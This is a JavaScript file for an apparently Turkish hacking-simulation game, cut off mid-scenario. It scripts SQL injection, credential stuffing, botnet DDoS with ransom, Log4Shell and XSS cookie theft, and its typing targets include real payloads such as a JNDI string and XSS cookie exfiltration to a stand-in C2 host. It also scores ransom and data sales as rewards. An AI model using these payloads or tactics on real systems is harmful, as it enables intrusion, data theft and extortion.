const HackPhases = (function () {
  function printSequence(lines, onDone) {
    let total = 0;
    lines.forEach(function (l) {
      total += (l.delay || 0);
      setTimeout(function () {
        TerminalApp.printOutput(l.text || '', l.cls || 'cmd-output');
      }, total);
    });
    if (onDone) setTimeout(onDone, total + 50);
  }
  function makeProgressBar(percent, width) {
    width = width || 30;
    const filled = Math.round((percent / 100) * width);
    const empty = width - filled;
    return '[' + '█'.repeat(filled) + '░'.repeat(empty) + '] ' + percent + '%';
  }
  function animateProgress(label, steps, stepDelay, onDone) {
    let current = 0;
    const interval = setInterval(function () {
      current += steps;
      if (current > 100) current = 100;
      const bar = makeProgressBar(current);
      TerminalApp.printOutput('  ' + label + ' ' + bar, 'cmd-warning');
      if (current >= 100) {
        clearInterval(interval);
        if (onDone) setTimeout(onDone, stepDelay);
      }
    }, stepDelay);
  }
  const PHASE_DEFS = {
    'sqli': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  KEŞİF & PORT TARAMA           ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Nmap taraması başlatılıyor...', cls: 'cmd-output', delay: 300 },
          { text: '    $ nmap -sV -p 80,443,3306,8080 --script=http-enum <HEDEF>', cls: 'cmd-info', delay: 400 },
          { text: '', delay: 200 },
          { text: 'Nmap scan report:', cls: 'cmd-output', delay: 500 },
          { text: '  80/tcp    open  http     Apache 2.4.49', cls: 'cmd-output', delay: 300 },
          { text: '  443/tcp   open  https    OpenSSL 1.1.1k', cls: 'cmd-output', delay: 300 },
          { text: '  3306/tcp  open  mysql    MySQL 5.7.35', cls: 'cmd-output', delay: 300 },
          { text: '  8080/tcp  open  http-alt Tomcat 9.0', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 200 },
          { text: '[!] HTTP enum tamamlandı: /login.php, /admin/, /api/v1/', cls: 'cmd-warning', delay: 400 },
          { text: '[!] MySQL portunun internete açık olduğu tespit edildi.', cls: 'cmd-warning', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Hangi giriş noktasına SQL injection denemeliyiz?',
        options: [
          '1) /login.php — username parametresi (filtresiz, doğrudan SQL sorgusuna ekleniyor)',
          '2) /api/v1/search — q parametresi (WAF korumalı, filtreli)',
          '3) /contact.php — email parametresi (sadece mail formatı kabul ediyor)',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] Doğru! Login formu en korumasız nokta — doğrudan SQL sorgusuna gidiyor.',
        failFeedback: "[✗] Yanlış! Filtreli endpoint'ler daha az verimli — şüphe arttı.",
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  SQL PAYLOAD ENJEKTE ET         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Login formunun username alanına şu payload\'ı tam olarak yaz:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: "' OR '1'='1' --",
        timeLimit: 20,
        hint: "Tırnak işaretlerine dikkat et!",
        successFeedback: '[✓] Payload enjekte edildi! SQL sorgusu bypass edildi.',
        failFeedback: '[✗] Hatalı payload! Filtreleme tetiklendi, iz bırakıldı.',
      },
      {
        type: 'choice',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  VERİ ÇEKME STRATEJİSİ         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Admin oturumu açıldı. Ne yapacaksın?', cls: 'cmd-output', delay: 300 },
        ],
        choices: [
          {
            text: '1) UNION SELECT ile tüm kullanıcı tablosunu dump et (yüksek ödül, yüksek iz)',
            rewardBonus: 30,
            suspicionBonus: 15,
            feedbackLines: [
              { text: '[*] UNION SELECT null, username, password FROM users --', cls: 'cmd-info', delay: 200 },
              { text: '[✓] 12.847 kullanıcı kaydı dump edildi!', cls: 'cmd-success', delay: 600 },
              { text: '[!] Büyük sorgu — veritabanı log\'larında iz bırakıldı.', cls: 'cmd-warning', delay: 400 },
            ]
          },
          {
            text: '2) Yalnızca admin şifrelerini sessizce çek (orta ödül, düşük iz)',
            rewardBonus: 15,
            suspicionBonus: 5,
            feedbackLines: [
              { text: '[*] SELECT username, password FROM users WHERE role="admin" LIMIT 5', cls: 'cmd-info', delay: 200 },
              { text: '[✓] 3 admin hesabı ele geçirildi.', cls: 'cmd-success', delay: 600 },
              { text: '[✓] Küçük sorgu — neredeyse iz bırakmadı.', cls: 'cmd-success', delay: 300 },
            ]
          },
          {
            text: '3) Veritabanı yapısını haritalayıp çık — ilerisi için (düşük ödül, sıfır iz)',
            rewardBonus: 5,
            suspicionBonus: 0,
            feedbackLines: [
              { text: '[*] SHOW TABLES; DESCRIBE users;', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Veritabanı şeması kaydedildi. İleride kullanılacak.', cls: 'cmd-success', delay: 600 },
              { text: '[✓] İz bırakılmadı.', cls: 'cmd-success', delay: 300 },
            ]
          },
        ]
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  VERİ AKTARIMI & KAPAT         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Şifreli kanal üzerinden veri aktarılıyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Exfiltration:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Veri güvenli sunucuya aktarıldı.', cls: 'cmd-success', delay: 300 },
          { text: '[*] Bağlantı sonlandırılıyor... oturum kapatılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '[✓] Bağlantı kapatıldı. İz temizlendi.', cls: 'cmd-success', delay: 500 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'credential-stuffing': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  COMBO LİSTESİ HAZIRLA         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Pwned-DB\'den güncel combo listesi çekiliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ curl -s https://pwned-db.onion/api/breach/hedefbank.com.tr', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  {"status":"ok","records":2847193,"source":"2024 Megabreach"}', cls: 'cmd-output', delay: 600 },
          { text: '', delay: 200 },
          { text: '[✓] 2.847.193 kullanıcı/şifre çifti indirildi.', cls: 'cmd-success', delay: 400 },
          { text: '[*] Filtre uygulanıyor: hedefbank.com.tr domainli e-postalar...', cls: 'cmd-output', delay: 400 },
          { text: '[✓] 18.492 hedef spesifik kayıt ayrıştırıldı.', cls: 'cmd-success', delay: 500 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Rate-limiting ve IP engellemeyi aşmak için ne kullanacaksın?',
        options: [
          '1) Rotasyonlu residential proxy listesi — her 50 denemede IP değiştir',
          '2) Tek VPN bağlantısı — hızlı ama yakalanmaya açık',
          '3) Doğrudan kendi IP\'nden — iz bırakma riski maksimum',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] Proxy rotasyonu aktif. Her 50 denemede otomatik IP değiştirme yapılıyor.',
        failFeedback: '[✗] Sabit IP\'den gelen yüzlerce istek — sistem alarm verdi!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  OTOMATİK GİRİŞ SALDIRISI      ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Credential stuffing motoru başlatılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ python3 credstuff.py --list combo.txt --target hedefbank --proxy rotate', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 200 },
          { text: '[*] İlerleme:', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Deneme:',
        outro: [
          { text: '', delay: 100 },
          { text: '  ╔═══════════════════════════════════╗', cls: 'cmd-success', delay: 300 },
          { text: '  ║  ÇALIŞAN HESAPLAR TESPİT EDİLDİ!  ║', cls: 'cmd-success', delay: 100 },
          { text: '  ╠═══════════════════════════════════╣', cls: 'cmd-success', delay: 100 },
          { text: '  ║  admin@hedefbank.com.tr : Tr06!34k ║', cls: 'cmd-success', delay: 200 },
          { text: '  ║  muhasebe@hedefbank.com.tr : 12345 ║', cls: 'cmd-success', delay: 200 },
          { text: '  ╚═══════════════════════════════════╝', cls: 'cmd-success', delay: 100 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'choice',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  HESAPLA NE YAPACAKSIN?         ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Admin paneline erişim sağlandı. Seçimini yap:', cls: 'cmd-output', delay: 300 },
        ],
        choices: [
          {
            text: '1) Tüm müşteri verilerini dışa aktar — maksimum fidye potansiyeli',
            rewardBonus: 25, suspicionBonus: 20,
            feedbackLines: [
              { text: '[*] Müşteri veri tabanı dışa aktarılıyor...', cls: 'cmd-info', delay: 200 },
              { text: '[✓] 847.000 müşteri kaydı indirildi.', cls: 'cmd-success', delay: 800 },
              { text: '[!] Büyük veri transferi tespit edilebilir!', cls: 'cmd-warning', delay: 400 },
            ]
          },
          {
            text: '2) Backdoor bırak, sessizce çık — gelecek için kalıcı erişim',
            rewardBonus: 10, suspicionBonus: 3,
            feedbackLines: [
              { text: '[*] Gizli admin hesabı oluşturuluyor: svc_backup / Tr@p!2025', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Arka kapı yerleştirildi. Sessizce çıkılıyor.', cls: 'cmd-success', delay: 800 },
              { text: '[✓] Minimum iz bırakıldı.', cls: 'cmd-success', delay: 300 },
            ]
          },
          {
            text: '3) Para transferi başlat — direk ödül ama yüksek alarm riski',
            rewardBonus: 50, suspicionBonus: 35,
            feedbackLines: [
              { text: '[*] SWIFT transfer başlatılıyor... Monero cüzdanına...', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Transfer onaylandı!', cls: 'cmd-success', delay: 800 },
              { text: '[!] Fraud sistemi alarm verdi! Hızlı çık!', cls: 'cmd-error', delay: 500 },
            ]
          },
        ]
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  OTURUM KAPAT & İZ TEMİZLE     ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Oturum logları temizleniyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Log Silme:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Auth logları temizlendi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Proxy zincirleri kesildi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Operasyon tamamlandı.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'rddos': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  BOTNET KONTROL PANEL          ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] C2 sunucusuna bağlanılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ ssh root@c2.shadow.onion -p 2222', cls: 'cmd-info', delay: 500 },
          { text: '    Connected to C2. 14.847 bot online.', cls: 'cmd-output', delay: 600 },
          { text: '', delay: 200 },
          { text: '  ┌─────────────────────────────────────┐', cls: 'cmd-info', delay: 300 },
          { text: '  │  BOTNET DURUMU                      │', cls: 'cmd-info', delay: 100 },
          { text: '  │  Aktif Bot: 14.847                  │', cls: 'cmd-info', delay: 100 },
          { text: '  │  Bant Genişliği: 2.3 Tbps           │', cls: 'cmd-info', delay: 100 },
          { text: '  │  Hedef Kapasitesi: ~850 Mbps        │', cls: 'cmd-info', delay: 100 },
          { text: '  └─────────────────────────────────────┘', cls: 'cmd-info', delay: 100 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Hedefin Cloudflare korumasını aşmak için ne yapmalısın?',
        options: [
          '1) Shodan ve censys.io ile arkadaki gerçek Origin IP\'yi tespit et',
          '2) DNS sunucusuna saldır — Cloudflare\'ı devre dışı bırakır',
          '3) Daha fazla bot ekle — brute force yöntemi',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] Origin IP tespit edildi: 185.234.XX.XX — Cloudflare bypass!',
        failFeedback: '[✗] Yanlış yöntem — Cloudflare DDoS trafiği emip filtreler!',
      },
      {
        type: 'question',
        question: '[AŞAMA 3/5] Hangi DDoS türü TCP kaynaklarını en çok tüketir?',
        options: [
          '1) UDP Flood — büyük paketler gönderir',
          '2) SYN Flood — yarım açık bağlantılarla sunucu kaynaklarını bitirir',
          '3) ICMP Flood — ping paketleri gönderir',
        ],
        answer: 2,
        penalty: 10,
        successFeedback: '[✓] SYN Flood seçildi! Her paket sunucuda bir bağlantı bekletir — kaynak bitişi garantili.',
        failFeedback: '[✗] Yanlış saldırı türü — etkisi düşük, filtrelenir.',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  SALDIRI BAŞLATILIYOR          ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] 14.847 bot hedefe yönlendiriliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ botnet attack --target 185.234.XX.XX --type synflood --bots all', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 200 },
        ],
        label: 'Saldırı Gücü:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Hedef çevrimdışı! Yanıt süresi: ZAMAN AŞIMI', cls: 'cmd-success', delay: 300 },
          { text: '[*] Fidye notu hazırlanıyor...', cls: 'cmd-output', delay: 400 },
        ]
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  FİDYE NOTU GÖNDER             ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Şifreli kanal üzerinden fidye notu gönderilecek.', cls: 'cmd-output', delay: 300 },
          { text: '[*] Monero cüzdan adresini nota eklemek için komutu yaz:', cls: 'cmd-output', delay: 400 },
          { text: '', delay: 100 },
        ],
        target: 'send-ransom --xmr --tor',
        timeLimit: 15,
        hint: 'Ödeme yöntemini ve ağı belirt!',
        successFeedback: '[✓] Fidye notu güvenli kanaldan iletildi. Ödeme bekleniyor.',
        failFeedback: '[✗] Hatalı komut! Fidye notu açık metin gönderildi — iz bırakıldı!',
      },
    ],
    'cve': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  CVE TARAMA & VERSİYON TESPİT  ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Hedef servis sürümleri tespit ediliyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ nmap -sV --script=banner <HEDEF>', cls: 'cmd-info', delay: 400 },
          { text: '', delay: 300 },
          { text: '  Apache Struts: 2.5.16  ← CVE-2017-5638 (RCE)', cls: 'cmd-warning', delay: 400 },
          { text: '  Log4j:         2.14.0  ← CVE-2021-44228 (Log4Shell) ★★★★★', cls: 'cmd-error', delay: 400 },
          { text: '  OpenSSL:       1.0.1f  ← CVE-2014-0160 (Heartbleed)', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Log4Shell kritik seviye! Yama uygulanmamış.', cls: 'cmd-warning', delay: 500 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Log4Shell (CVE-2021-44228) ne tür bir açıktır?',
        options: [
          '1) Remote Code Execution — hedef sunucuda istediğimiz kodu çalıştırma',
          '2) SQL Injection — veritabanı sorgularını manipüle etme',
          '3) XSS — kullanıcı tarayıcısında kod çalıştırma',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] RCE! Uzaktan kod çalıştırma — sistemin tam kontrolü demek.',
        failFeedback: '[✗] Yanlış! Log4j ağ log kütüphanesi, veritabanı veya tarayıcı değil.',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  LOG4SHELL PAYLOAD ENJEKSİYONU  ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Log4j\'nin JNDI lookup özelliğini tetikleyecek payload:', cls: 'cmd-output', delay: 300 },
          { text: '[*] Bu payload\'ı User-Agent header\'ına enjekte etmek için yaz:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: '${jndi:ldap://c2.shadow.onion/exploit}',
        timeLimit: 25,
        hint: 'Kıvrımlı süslü parantez ve JNDI protokolünü kullan!',
        successFeedback: '[✓] Payload Log4j tarafından işlendi! C2\'ye bağlantı kuruldu.',
        failFeedback: '[✗] Hatalı payload — Log4j parse edemedi. Tekrar dene!',
      },
      {
        type: 'question',
        question: '[AŞAMA 4/5] RCE sağlandı. Kalıcı erişim için ne yapmalısın?',
        options: [
          '1) Sistemd service veya cron job olarak reverse shell backdoor kur',
          '2) /tmp dizinine zararlı yazılım bırak (yeniden başlamada silinir)',
          '3) Bulguları not al ve çık — tek seferlik kullan',
        ],
        answer: 1,
        penalty: 15,
        successFeedback: '[✓] Systemd servisi oluşturuldu. Yeniden başlamadan sonra da erişim var!',
        failFeedback: '[✗] /tmp geçici! Sunucu yeniden başladığında erişim kaybolur.',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  BACKDOOR KURULUM & KAPAT      ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Kalıcı backdoor kuruluyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Kurulum:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] /etc/systemd/system/svc_network.service oluşturuldu.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] systemctl enable svc_network — aktif.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Log dosyaları temizlendi.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] CVE exploit başarıyla tamamlandı.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'xss': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  INJECTION NOKTASI ARAŞTIR     ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] XSS tarayıcısı çalıştırılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ xsstrike --url <HEDEF> --crawl --blind', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  [FOUND] /search?q= — Reflected XSS (no sanitization)', cls: 'cmd-warning', delay: 400 },
          { text: '  [FOUND] /comment — Stored XSS (textarea unsanitized)', cls: 'cmd-error', delay: 400 },
          { text: '  [SAFE]  /login — CSP header aktif', cls: 'cmd-output', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Stored XSS daha güçlü — tüm ziyaretçileri etkiler!', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] Cookie çalmak için hangi payload kullanılmalı?',
        options: [
          '1) <script>fetch("http://c2.shadow.onion/?c="+document.cookie)</script>',
          '2) \' OR \'1\'=\'1\'-- (SQL injection, yanlış context)',
          '3) <img src=x> (resim etiketi, cookie çalmaz)',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] XSS payload hazır! fetch() ile cookie C2\'ye gönderilecek.',
        failFeedback: '[✗] Bu payload XSS için değil — context hatası, iz bıraktı!',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  PAYLOAD YORUM ALANA ENJEKSİYON ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] /comment endpoint\'ine Stored XSS enjekte et.', cls: 'cmd-output', delay: 300 },
          { text: '[*] Kısaltılmış payload\'ı yaz (obfuscated):', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: '<img src=x onerror=this.src="//c2/"+document.cookie>',
        timeLimit: 25,
        hint: 'img etiketiyle onerror event handler kullan!',
        successFeedback: '[✓] Payload yorum kutusuna kaydedildi. Ziyaretçi cookie\'leri artık sana akar.',
        failFeedback: '[✗] Hatalı sözdizimi — tarayıcı parse edemedi!',
      },
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  SESSION HIJACKING              ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] C2 loglarını kontrol ediyorum...', cls: 'cmd-output', delay: 400 },
          { text: '    $ tail -f /var/log/c2/cookies.log', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  [NEW] admin@site.com → session_id=eyJhbGci...TrTq9 (15:42:07)', cls: 'cmd-success', delay: 500 },
          { text: '  [NEW] user_2847@site.com → session_id=eyJhbGci...Xt4Pm (15:43:22)', cls: 'cmd-success', delay: 400 },
          { text: '', delay: 200 },
          { text: '[!] Admin cookie yakalandı! Session taklit ediliyor...', cls: 'cmd-warning', delay: 400 },
          { text: '[✓] Admin paneline session hijacking ile girildi!', cls: 'cmd-success', delay: 500 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  VERİ ÇEKME & KAPAT            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Admin yetkisiyle kullanıcı veritabanı dışa aktarılıyor...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Veri Aktarımı:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] Kullanıcı verileri şifreli kaynağa aktarıldı.', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Payload yorum kutusundan silindi — iz temizlendi.', cls: 'cmd-success', delay: 400 },
          { text: '[✓] XSS operasyonu tamamlandı.', cls: 'cmd-success', delay: 300 },
          { text: '', delay: 200 },
        ]
      },
    ],
    'bola': [
      {
        type: 'print',
        lines: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 1/5]  API ENDPOİNT KEŞİF            ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] API endpoint\'leri numaralandırılıyor...', cls: 'cmd-output', delay: 400 },
          { text: '    $ ffuf -u <HEDEF>/api/FUZZ -w api_wordlist.txt', cls: 'cmd-info', delay: 500 },
          { text: '', delay: 300 },
          { text: '  /api/v1/users/profile?id=1  [200 OK]', cls: 'cmd-success', delay: 300 },
          { text: '  /api/v1/orders?user_id=1    [200 OK]', cls: 'cmd-success', delay: 300 },
          { text: '  /api/v1/invoices?id=1       [200 OK]', cls: 'cmd-success', delay: 300 },
          { text: '  /api/v1/admin/              [403 Forbidden]', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 200 },
          { text: '[!] Tahmin edilebilir sayısal ID\'ler tespit edildi!', cls: 'cmd-warning', delay: 400 },
          { text: '', delay: 200 },
        ]
      },
      {
        type: 'question',
        question: '[AŞAMA 2/5] BOLA/IDOR saldırısında ne yapılmalı?',
        options: [
          '1) ID parametresini artırıp azaltarak diğer kullanıcı verilerine eriş',
          '2) Admin\'in şifresini brute-force et',
          '3) Sunucuya DDoS at ve yanıtları yakala',
        ],
        answer: 1,
        penalty: 10,
        successFeedback: '[✓] Doğru! API yetkilendirme kontrol etmiyor — ID değiştirince herkese erişebiliriz.',
        failFeedback: '[✗] Yanlış teknik! IDOR yetkilendirme zafiyetidir, kaba kuvvet değil.',
      },
      {
        type: 'typing',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 3/5]  OTOMATİK IDOR TARAMASI        ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] Tüm kullanıcı profillerini otomatik çekecek scripti başlat:', cls: 'cmd-output', delay: 300 },
          { text: '', delay: 100 },
        ],
        target: 'for i in {1..50000}; do curl -s /api/v1/users/profile?id=$i >> dump.json; done',
        timeLimit: 30,
        hint: 'for döngüsü ve curl komutunu birleştir!',
        successFeedback: '[✓] Script başlatıldı! 50.000 profil çekiliyor...',
        failFeedback: '[✗] Hatalı script — curl bağlantısı reddedildi!',
      },
      {
        type: 'progress',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 4/5]  VERİ TOPLAMA                  ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] API istekleri gönderiliyor — rate limit\'e dikkat...', cls: 'cmd-output', delay: 300 },
        ],
        label: 'Profil Çekme:',
        outro: [
          { text: '', delay: 100 },
          { text: '[✓] 47.832 kullanıcı profili toplandı!', cls: 'cmd-success', delay: 300 },
          { text: '[✓] Ad, email, telefon, adres verileri mevcut.', cls: 'cmd-success', delay: 300 },
          { text: '[*] Veri satışa hazırlanıyor...', cls: 'cmd-output', delay: 400 },
        ]
      },
      {
        type: 'choice',
        intro: [
          { text: '', delay: 0 },
          { text: '╔══════════════════════════════════════════════╗', cls: 'cmd-warning', delay: 0 },
          { text: '║  [AŞAMA 5/5]  VERİ İLE NE YAPACAKSIN?       ║', cls: 'cmd-warning', delay: 50 },
          { text: '╚══════════════════════════════════════════════╝', cls: 'cmd-warning', delay: 50 },
          { text: '', delay: 100 },
          { text: '[*] 47.832 kullanıcı verisi hazır. Seçimini yap:', cls: 'cmd-output', delay: 300 },
        ],
        choices: [
          {
            text: '1) Karanlık pazarda KVKK ihlali tehdidiyle sat — yüksek gelir',
            rewardBonus: 30, suspicionBonus: 12,
            feedbackLines: [
              { text: '[*] KaranlıkPazar\'a listeleniyor: "47K KVKK ihlali verisi"', cls: 'cmd-info', delay: 200 },
              { text: '[✓] Alıcı bulundu! Veri transfer edildi.', cls: 'cmd-success', delay: 600 },
            ]
          },
          {
            text: '2) Şirkete KVKK ihlali bildirerek fidye talep et',
            rewardBonus: 20, suspicionBonus: 8,
            feedbackLines: [
